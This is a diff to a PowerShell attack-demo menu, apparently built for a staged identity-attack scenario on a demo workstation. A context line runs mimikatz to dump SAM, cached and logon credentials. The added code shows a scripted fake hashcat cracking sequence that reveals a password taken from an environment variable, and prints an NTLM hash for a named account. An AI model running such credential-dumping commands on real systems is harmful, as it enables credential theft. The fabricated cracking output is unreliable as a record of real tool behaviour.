@@ -1,4 +1,4 @@
-﻿﻿# ============================================================
+﻿﻿﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -87,7 +87,51 @@ do {
             & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"
 
             Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
-            Write-Host "[*] Expected finding: clark.monroe NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor Cyan
+            Write-Host "[+] Found cached domain account: clark.monroe" -ForegroundColor Green
+            Write-Host "    NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor White
+            Write-Host
+            Write-Host "[*] Attempting offline hash cracking..." -ForegroundColor Cyan
+
+            # Fake cracking animation
+            $fakes = @(
+                "hashcat -m 1000 -a 0 hash.txt rockyou.txt",
+                "Session..........: hashcat",
+                "Status...........: Running",
+                "Hash.Mode........: 1000 (NTLM)",
+                "Speed.#1.........:  1425.3 MH/s",
+                "Recovered........: 0/1 (0.00%)",
+                "Progress.........: 14344384/14344384 (100.00%)",
+                "Status...........: Exhausted",
+                "",
+                "hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a",
+                "Status...........: Running",
+                "Hash.Mode........: 1000 (NTLM)",
+                "Speed.#1.........:  1425.3 MH/s"
+            )
+            foreach ($line in $fakes) {
+                Write-Host "  $line" -ForegroundColor DarkGray
+                Start-Sleep -Milliseconds 300
+            }
+
+            # Progress dots
+            Write-Host -NoNewline "  Cracking" -ForegroundColor DarkGray
+            for ($i = 0; $i -lt 8; $i++) {
+                Write-Host -NoNewline "." -ForegroundColor DarkGray
+                Start-Sleep -Milliseconds 400
+            }
+            Write-Host
+
+            # Reveal
+            Write-Host
+            Write-Host "  802ec5974a4f18e086e8b1411b2e3ea3:$env:ENV_PASSWORD" -ForegroundColor Green
+            Write-Host
+            Write-Host "  Session..........: hashcat" -ForegroundColor DarkGray
+            Write-Host "  Status...........: Cracked" -ForegroundColor Green
+            Write-Host "  Recovered........: 1/1 (100.00%)" -ForegroundColor Green
+            Write-Host
+
+            Write-Host "[+] Password cracked: clark.monroe => $env:ENV_PASSWORD" -ForegroundColor Green
+            Write-Host "[*] This password will be used for LDAP recon (Step 3) and kerbrute (Step 4)." -ForegroundColor Cyan
             Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
         }
 
